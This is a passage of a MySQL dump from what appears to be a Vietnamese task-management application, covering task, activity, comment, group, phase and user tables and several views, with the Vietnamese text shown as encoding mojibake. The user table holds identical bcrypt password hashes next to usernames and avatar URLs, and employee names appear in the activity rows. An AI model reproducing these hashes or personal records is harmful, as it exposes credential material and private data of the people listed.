  `EndDate` datetime DEFAULT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatorID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `TaskGroupID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Progress` int DEFAULT '0',
  `ParentID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PerformerID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Status` smallint DEFAULT '2',
  `FinishDate` datetime DEFAULT NULL,
  `AssignorID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Active` smallint DEFAULT '1',
  PRIMARY KEY (`TaskID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├┤ng viß╗çc';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `task`
--

LOCK TABLES `task` WRITE;
/*!40000 ALTER TABLE `task` DISABLE KEYS */;
INSERT INTO `task` VALUES ('1c02e56c-36c8-11ee-bacd-0242ac130002','Cß║¡p nhß║¡t doanh sß╗æ',NULL,NULL,NULL,'dcb94c92-1048-11ee-98af-0242ac130002','2023-08-09 22:19:18','53da58f8-ef0d-11ed-ae2b-0242ac130002','f1febe17-133c-11ee-80cb-0242ac130002',0,'8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','aea2e463-31a5-11ee-bb11-0242ac130002',0,NULL,NULL,1),('274ceabd-5eda-4992-93e2-0a4c4c8e2045','C├┤ng viß╗çc A','<p>Thß╗▒c hiß╗çn ─æß║ºy ─æß╗º c&ocirc;ng viß╗çc A trong ─æ&uacute;ng thß╗¥i gian.</p>','2023-08-07 17:00:00','2023-08-10 17:00:00','dcb94c92-1048-11ee-98af-0242ac130002','2023-08-01 07:22:58','53da58f8-ef0d-11ed-ae2b-0242ac130002','9b4d2d9b-1371-11ee-80cb-0242ac130002',0,NULL,'ddc7a9f4-13b9-11ee-b55a-0242ac130002',2,'2023-08-07 00:00:00',NULL,1),('33278c99-cf60-40b6-9bb2-0c53f9fb1d87','C├┤ng viß╗çc 1','<p>─É&acirc;y l&agrave; m&ocirc; tß║ú vß╗ü c&ocirc;ng viß╗çc 1.</p>','2023-07-23 17:00:00','2023-08-01 17:00:00','dcb94c92-1048-11ee-98af-0242ac130002','2023-07-31 22:17:23','53da58f8-ef0d-11ed-ae2b-0242ac130002','f1febe17-133c-11ee-80cb-0242ac130002',0,NULL,'848e4747-13c6-11ee-b55a-0242ac130002',2,NULL,'53da58f8-ef0d-11ed-ae2b-0242ac130002',1),('4a9ff2b6-fe33-41ea-a7d7-4ee98cea1112','C├┤ng viß╗çc con B',NULL,NULL,NULL,'dcb94c92-1048-11ee-98af-0242ac130002','2023-08-10 21:37:12','53da58f8-ef0d-11ed-ae2b-0242ac130002','f1febe17-133c-11ee-80cb-0242ac130002',0,'33278c99-cf60-40b6-9bb2-0c53f9fb1d87','aea2e463-31a5-11ee-bb11-0242ac130002',2,NULL,NULL,1),('65d8606c-9c22-4c8a-8acf-42c5b4f7fbf7','Thß╗▒c hiß╗çn c├┤ng viß╗çc',NULL,NULL,NULL,'9a78db36-1048-11ee-98af-0242ac130002','2023-08-10 17:32:55','53da58f8-ef0d-11ed-ae2b-0242ac130002','f1febe17-133c-11ee-80cb-0242ac130002',0,NULL,'53da58f8-ef0d-11ed-ae2b-0242ac130002',2,NULL,NULL,1),('8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','Cß║¡p nhß║¡t lß║íi doanh sß╗æ tr╞░ß╗¢c kß╗│ b├ío c├ío v├áo 14/09',NULL,'2023-08-09 17:00:00','2023-08-13 03:30:00','dcb94c92-1048-11ee-98af-0242ac130002','2023-08-09 22:19:18','53da58f8-ef0d-11ed-ae2b-0242ac130002','f1febe17-133c-11ee-80cb-0242ac130002',0,NULL,'848e4747-13c6-11ee-b55a-0242ac130002',2,NULL,NULL,1);
/*!40000 ALTER TABLE `task` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `taskactivity`
--

DROP TABLE IF EXISTS `taskactivity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `taskactivity` (
  `ActivityID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TaskID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Column` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `OldValue` text COLLATE utf8mb4_unicode_ci,
  `NewValue` text COLLATE utf8mb4_unicode_ci,
  `Type` smallint DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `OldTextValue` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `NewTextValue` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`ActivityID`),
  KEY `FK_taskactivity_TaskID` (`TaskID`),
  CONSTRAINT `FK_taskactivity_TaskID` FOREIGN KEY (`TaskID`) REFERENCES `task` (`TaskID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc hoß║ít ─æß╗Öng cß╗ºa tß╗½ng c├┤ng viß╗çc';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `taskactivity`
--

LOCK TABLES `taskactivity` WRITE;
/*!40000 ALTER TABLE `taskactivity` DISABLE KEYS */;
INSERT INTO `taskactivity` VALUES ('0610f867-3767-11ee-be99-0242ac130002','274ceabd-5eda-4992-93e2-0a4c4c8e2045','Progress','100','0',2,'2023-08-10 17:16:51','B-1179','',''),('1c0942f1-36c8-11ee-bacd-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','Task',NULL,NULL,1,'2023-08-09 22:19:18','B-1022',NULL,NULL),('338b390d-3744-11ee-be99-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','Checklists','cba5c360-ca75-4c09-a48a-43a16f8f1bb6',NULL,3,'2023-08-10 13:07:35','B-1179','Cß║¡p nhß║¡t doanh sß╗æ A.',NULL),('3ebbcfe2-3748-11ee-be99-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','Progress','0','100',2,'2023-08-10 13:36:32','B-1179','',''),('44c65d9f-3769-11ee-be99-0242ac130002','65d8606c-9c22-4c8a-8acf-42c5b4f7fbf7','Task',NULL,NULL,1,'2023-08-10 17:32:56','B-1179',NULL,NULL),('4763ab19-3748-11ee-be99-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','Progress','100','0',2,'2023-08-10 13:36:46','B-1179','',''),('545d51e8-3793-11ee-be99-0242ac130002','33278c99-cf60-40b6-9bb2-0c53f9fb1d87','Subtasks','50d0295c-df02-42ac-956e-d2dc61aed4af',NULL,3,'2023-08-10 22:34:01','B-1179','C├┤ng viß╗çc con A',NULL),('596cfaba-2fb5-11ee-8c2d-0242ac130002','33278c99-cf60-40b6-9bb2-0c53f9fb1d87','Task',NULL,NULL,1,'2023-07-31 22:17:23','B-1179',NULL,NULL),('60a06e97-3747-11ee-be99-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','Progress','50','0',2,'2023-08-10 13:30:19','B-1179','',''),('64fa503f-378b-11ee-be99-0242ac130002','4a9ff2b6-fe33-41ea-a7d7-4ee98cea1112','Task',NULL,NULL,1,'2023-08-10 21:37:12',NULL,NULL,NULL),('687bf1cc-36dd-11ee-bacd-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','Progress','0','50',2,'2023-08-10 00:51:46','B-1179',NULL,NULL),('7094744f-374c-11ee-be99-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','TaskName','Cß║¡p nhß║¡t lß║íi doanh sß╗æ tr╞░ß╗¢c kß╗│ b├ío c├ío v├áo 14/08','Cß║¡p nhß║¡t lß║íi doanh sß╗æ tr╞░ß╗¢c kß╗│ b├ío c├ío v├áo 14/09',2,'2023-08-10 14:06:34','B-1179','',''),('919c458a-3001-11ee-a453-0242ac130002','274ceabd-5eda-4992-93e2-0a4c4c8e2045','Task',NULL,NULL,1,'2023-08-01 07:22:59','B-1160',NULL,NULL),('a3c510db-3001-11ee-a453-0242ac130002','274ceabd-5eda-4992-93e2-0a4c4c8e2045','Progress','0','100',2,'2023-08-01 07:23:29','B-1179',NULL,NULL),('b053c7ba-374c-11ee-be99-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','TaskComment','','H├úy thß╗▒c hiß╗çn thß║¡t nhanh',1,'2023-08-10 14:08:21','B-1179',NULL,NULL),('b7b670a1-3001-11ee-a453-0242ac130002','274ceabd-5eda-4992-93e2-0a4c4c8e2045','TaskComment','','─É├ú thß╗▒c hiß╗çn ─æ╞░ß╗úc 25% c├┤ng viß╗çc',1,'2023-08-01 07:24:03','B-1179',NULL,NULL),('d22fcbbd-3763-11ee-be99-0242ac130002','33278c99-cf60-40b6-9bb2-0c53f9fb1d87','Performer','53da58f8-ef0d-11ed-ae2b-0242ac130002','848e4747-13c6-11ee-b55a-0242ac130002',2,'2023-08-10 16:53:56','B-1179','Trß║ºn Ngß╗ìc L├óm','─É├áo Xu├ón S╞ín'),('fe4bc6a6-374e-11ee-be99-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','Performer','aea2e463-31a5-11ee-bb11-0242ac130002','848e4747-13c6-11ee-b55a-0242ac130002',2,'2023-08-10 14:24:50','B-1179','Nguyß╗àn Thuß╗│ Linh','─É├áo Xu├ón S╞ín');
/*!40000 ALTER TABLE `taskactivity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `taskcomment`
--

DROP TABLE IF EXISTS `taskcomment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `taskcomment` (
  `CommentID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TaskID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Content` text COLLATE utf8mb4_unicode_ci,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ModifiedDate` datetime DEFAULT NULL,
  PRIMARY KEY (`CommentID`),
  KEY `FK_taskcomment_TaskID` (`TaskID`),
  CONSTRAINT `FK_taskcomment_TaskID` FOREIGN KEY (`TaskID`) REFERENCES `task` (`TaskID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc b├¼nh luß║¡n c├┤ng viß╗çc';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `taskcomment`
--

LOCK TABLES `taskcomment` WRITE;
/*!40000 ALTER TABLE `taskcomment` DISABLE KEYS */;
INSERT INTO `taskcomment` VALUES ('b04f5ca2-374c-11ee-be99-0242ac130002','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1','H├úy thß╗▒c hiß╗çn thß║¡t nhanh','2023-08-10 14:08:21','B-1179',NULL),('b7b2279f-3001-11ee-a453-0242ac130002','274ceabd-5eda-4992-93e2-0a4c4c8e2045','─É├ú thß╗▒c hiß╗çn ─æ╞░ß╗úc 25% c├┤ng viß╗çc','2023-08-01 07:24:03','B-1179',NULL);
/*!40000 ALTER TABLE `taskcomment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `taskfile`
--

DROP TABLE IF EXISTS `taskfile`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `taskfile` (
  `TaskFileID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TaskID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `FileID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  PRIMARY KEY (`TaskFileID`),
  KEY `FK_task_files_TaskID` (`TaskID`),
  CONSTRAINT `FK_task_files_TaskID` FOREIGN KEY (`TaskID`) REFERENCES `task` (`TaskID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng ';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `taskfile`
--

LOCK TABLES `taskfile` WRITE;
/*!40000 ALTER TABLE `taskfile` DISABLE KEYS */;
/*!40000 ALTER TABLE `taskfile` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `taskgroup`
--

DROP TABLE IF EXISTS `taskgroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `taskgroup` (
  `TaskGroupID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TaskGroupName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`TaskGroupID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng nh├│m c├┤ng viß╗çc';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `taskgroup`
--

LOCK TABLES `taskgroup` WRITE;
/*!40000 ALTER TABLE `taskgroup` DISABLE KEYS */;
INSERT INTO `taskgroup` VALUES ('9b4d2d9b-1371-11ee-80cb-0242ac130002','─É├ú thß╗▒c hiß╗çn','2023-06-26 00:00:00','B-1179'),('f1febe17-133c-11ee-80cb-0242ac130002','Cß║ºn thß╗▒c hiß╗çn','2023-06-24 00:00:00','B-1179'),('fe32bf63-133c-11ee-80cb-0242ac130002','─Éang thß╗▒c hiß╗çn','2023-06-25 00:00:00','B-1179');
/*!40000 ALTER TABLE `taskgroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `taskphase`
--

DROP TABLE IF EXISTS `taskphase`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `taskphase` (
  `TaskPhaseID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TaskID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PhaseID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`TaskPhaseID`),
  KEY `FK_taskphase_PhaseID` (`PhaseID`),
  CONSTRAINT `FK_taskphase_PhaseID` FOREIGN KEY (`PhaseID`) REFERENCES `phase` (`PhaseID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `taskphase`
--

LOCK TABLES `taskphase` WRITE;
/*!40000 ALTER TABLE `taskphase` DISABLE KEYS */;
INSERT INTO `taskphase` VALUES ('64f75b70-352f-11ee-8171-0242ac130002','274ceabd-5eda-4992-93e2-0a4c4c8e2045','e520a8b3-a393-49ad-8e52-9924f0f87828','2023-08-07 21:33:36','B-1179');
/*!40000 ALTER TABLE `taskphase` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `taskphasehistory`
--

DROP TABLE IF EXISTS `taskphasehistory`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `taskphasehistory` (
  `ID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TaskID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `OldPhaseID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `NewPhaseID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ChangeDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `OldStatus` int DEFAULT NULL,
  `NewStatus` int DEFAULT NULL,
  `Type` int DEFAULT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `taskphasehistory`
--

LOCK TABLES `taskphasehistory` WRITE;
/*!40000 ALTER TABLE `taskphasehistory` DISABLE KEYS */;
INSERT INTO `taskphasehistory` VALUES ('66616205-34fd-11ee-8171-0242ac130002','274ceabd-5eda-4992-93e2-0a4c4c8e2045',NULL,'16ea8282-cfe3-47f2-8853-545e27c713ba','2023-08-07 00:00:00','B-1179',NULL,NULL,NULL),('817a23e5-34fd-11ee-8171-0242ac130002','33278c99-cf60-40b6-9bb2-0c53f9fb1d87',NULL,'16ea8282-cfe3-47f2-8853-545e27c713ba','2023-08-06 00:00:00','B-1179',NULL,NULL,NULL);
/*!40000 ALTER TABLE `taskphasehistory` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user` (
  `UserID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `Password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `Avatar` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `EmployeeID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`UserID`),
  UNIQUE KEY `FK_account_EmployeeID` (`UserID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng th├┤ng tin t├ái khoß║ún';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES ('330b1cdc-fd2d-11ed-a39f-0242ac130002','B-1179','$2y$10$pVwNrm3FmQ7Z8I8JSHb10.TW8EYT0nrGzimxY2uy9otUHc7MBgis.','https://lh3.googleusercontent.com/a/AAcHTte7c6WXWPi4DFYDRRXFjOxHixHA--UZAsu5NFbE_g=s360-c-no','2023-05-28 08:00:56','53da58f8-ef0d-11ed-ae2b-0242ac130002'),('447ccaea-31a5-11ee-bb11-0242ac130002','B-0860','$2y$10$pVwNrm3FmQ7Z8I8JSHb10.TW8EYT0nrGzimxY2uy9otUHc7MBgis.','https://mpsstorage20.blob.core.windows.net/mpsresource/3.jpg','2023-08-01 00:00:00','701db6c7-31a5-11ee-bb11-0242ac130002'),('bb47de55-13b9-11ee-b55a-0242ac130002','B-1160','$2y$10$pVwNrm3FmQ7Z8I8JSHb10.TW8EYT0nrGzimxY2uy9otUHc7MBgis.','https://mpsstorage20.blob.core.windows.net/mpsresource/1.jpg','2023-06-07 00:00:00','ddc7a9f4-13b9-11ee-b55a-0242ac130002'),('f6005272-31a5-11ee-bb11-0242ac130002','B-1022','$2y$10$pVwNrm3FmQ7Z8I8JSHb10.TW8EYT0nrGzimxY2uy9otUHc7MBgis.','https://mpsstorage20.blob.core.windows.net/mpsresource/2.jpg','2023-07-02 00:00:00','aea2e463-31a5-11ee-bb11-0242ac130002'),('ff3e86ac-13c6-11ee-b55a-0242ac130002','B-1120','$2y$10$pVwNrm3FmQ7Z8I8JSHb10.TW8EYT0nrGzimxY2uy9otUHc7MBgis.','https://lh3.googleusercontent.com/x0iUtqPVuBxMcmrJvlK5Uwtj6lGE1qAUZ1UxdwATHyPrJIACjsVrA-8cmPVpf3ZRFGeLXUaFOAOLVD4-EauBJHczuA=s1157','2023-06-05 00:00:00','848e4747-13c6-11ee-b55a-0242ac130002');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Final view structure for view `View_Employee_Department`
--

/*!50001 DROP VIEW IF EXISTS `View_Employee_Department`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Employee_Department` AS select `department`.`DepartmentID` AS `DepartmentID`,`department`.`DepartmentName` AS `DepartmentName`,`department`.`CreatedBy` AS `CreatedBy`,`department`.`CreatedDate` AS `CreatedDate`,`employee`.`EmployeeID` AS `EmployeeID`,`employee`.`EmployeeCode` AS `EmployeeCode`,`employee`.`FullName` AS `FullName`,`employee`.`Email` AS `Email`,`employee`.`PositionName` AS `PositionName`,`employee`.`StructureID` AS `StructureID`,`employee`.`Avatar` AS `Avatar`,`project`.`ProjectID` AS `ProjectID`,`project`.`ProjectName` AS `ProjectName`,`project_employees`.`PermissionGroupID` AS `PermissionGroupID` from (((`View_Employee_Info` `employee` left join `project_employees` on((`employee`.`EmployeeID` = `project_employees`.`EmployeeID`))) left join `project` on((`project`.`ProjectID` = `project_employees`.`ProjectID`))) left join `department` on((`department`.`DepartmentID` = `project`.`DepartmentID`))) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;

--
-- Final view structure for view `View_Employee_Info`
--

/*!50001 DROP VIEW IF EXISTS `View_Employee_Info`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Employee_Info` AS select `employee`.`EmployeeID` AS `EmployeeID`,`employee`.`EmployeeCode` AS `EmployeeCode`,`employee`.`FullName` AS `FullName`,`employee`.`Email` AS `Email`,`employee`.`PositionName` AS `PositionName`,`employee`.`StructureID` AS `StructureID`,`user`.`Avatar` AS `Avatar`,`user`.`UserID` AS `UserID` from (`employee` left join `user` on((`employee`.`EmployeeID` = `user`.`EmployeeID`))) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;

--
-- Final view structure for view `View_Issue_Project`
--

/*!50001 DROP VIEW IF EXISTS `View_Issue_Project`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Issue_Project` AS select `issue`.`IssueID` AS `IssueID`,`issue`.`IssueKey` AS `IssueKey`,`issue`.`IssueName` AS `IssueName`,`issue`.`Description` AS `Description`,`issue`.`CustomerInfoID` AS `CustomerInfoID`,`issue`.`ReceptionDate` AS `ReceptionDate`,`issue`.`CreatorID` AS `CreatorID`,`issue`.`AssigneeID` AS `AssigneeID`,`issue`.`CreatedDate` AS `CreatedDate`,`issue`.`ModifiedDate` AS `ModifiedDate`,`issue`.`DesiredDate` AS `DesiredDate`,`issue`.`IssueStatus` AS `IssueStatus`,`issue`.`SolutionID` AS `SolutionID`,`issue`.`PreliminarySolution` AS `PreliminarySolution`,`issue`.`ProjectID` AS `ProjectID`,`issue`.`ProjectVersionID` AS `ProjectVersionID`,`issue`.`IssueTypeID` AS `IssueTypeID`,`issue`.`Priority` AS `Priority`,`creator`.`FullName` AS `CreatorName`,`creator`.`EmployeeCode` AS `CreatorCode`,`creator`.`Avatar` AS `CreatorAvatar`,`assignee`.`FullName` AS `AssigneeName`,`assignee`.`Avatar` AS `AssigneeAvatar`,`assignee`.`EmployeeCode` AS `AssigneeCode`,`customerinfo`.`PhoneNumber` AS `CustomerPhoneNumber`,`customerinfo`.`Email` AS `CustomerEmail`,`customerinfo`.`ContactInfo` AS `CustomerContactInfo`,`issuetype`.`IssueTypeName` AS `IssueTypeName`,`issuetype`.`Avatar` AS `IssueTypeAvatar`,`issuetype`.`Description` AS `IssueTypeDescription`,`issuesolution`.`SolutionName` AS `SolutionName` from (((((`issue` left join `View_Employee_Info` `creator` on((`issue`.`CreatorID` = `creator`.`EmployeeID`))) left join `View_Employee_Info` `assignee` on((`issue`.`AssigneeID` = `assignee`.`EmployeeID`))) left join `issuetype` on((`issue`.`IssueTypeID` = `issuetype`.`IssueTypeID`))) left join `customerinfo` on((`issue`.`CustomerInfoID` = `customerinfo`.`CustomerInfoID`))) left join `issuesolution` on((`issue`.`SolutionID` = `issuesolution`.`SolutionID`))) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;

--
-- Final view structure for view `View_Post_Project`
--

/*!50001 DROP VIEW IF EXISTS `View_Post_Project`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Post_Project` AS select `post`.`PostID` AS `PostID`,`post`.`ProjectID` AS `ProjectID`,`post`.`AuthorID` AS `AuthorID`,`post`.`Content` AS `Content`,`post`.`PostCategoryID` AS `PostCategoryID`,`post`.`CreatedDate` AS `CreatedDate`,`post`.`ModifiedDate` AS `ModifiedDate`,`post`.`Title` AS `Title`,`author`.`EmployeeCode` AS `AuthorCode`,`author`.`FullName` AS `AuthorName`,`author`.`Avatar` AS `AuthorAvatar`,`postcategory`.`CategoryName` AS `PostCategoryName` from ((`post` left join `View_Employee_Info` `author` on((`post`.`AuthorID` = `author`.`EmployeeID`))) left join `postcategory` on((`post`.`PostCategoryID` = `postcategory`.`PostCategoryID`))) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;

--
-- Final view structure for view `View_Subtask`
--

/*!50001 DROP VIEW IF EXISTS `View_Subtask`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Subtask` AS select `task`.`TaskID` AS `TaskID`,`task`.`TaskName` AS `TaskName`,`task`.`Description` AS `Description`,`task`.`StartDate` AS `StartDate`,`task`.`EndDate` AS `EndDate`,`task`.`ProjectID` AS `ProjectID`,`task`.`CreatedDate` AS `CreatedDate`,`task`.`CreatorID` AS `CreatorID`,`task`.`TaskGroupID` AS `TaskGroupID`,`task`.`Progress` AS `Progress`,`task`.`ParentID` AS `ParentID`,`task`.`PerformerID` AS `PerformerID`,`task`.`Status` AS `Status`,`creator`.`FullName` AS `CreatorName`,`taskgroup`.`TaskGroupName` AS `TaskGroupName`,`performer`.`FullName` AS `PerformerName`,`performer`.`Avatar` AS `PerformerAvatar`,`creator`.`Avatar` AS `CreatorAvatar` from (((`task` left join `View_Employee_Info` `creator` on((`creator`.`EmployeeID` = `task`.`CreatorID`))) left join `taskgroup` on((`task`.`TaskGroupID` = `taskgroup`.`TaskGroupID`))) left join `View_Employee_Info` `performer` on((`task`.`PerformerID` = `performer`.`EmployeeID`))) where (`task`.`ParentID` is not null) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;

--
-- Final view structure for view `View_Task_Phase`
--

/*!50001 DROP VIEW IF EXISTS `View_Task_Phase`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
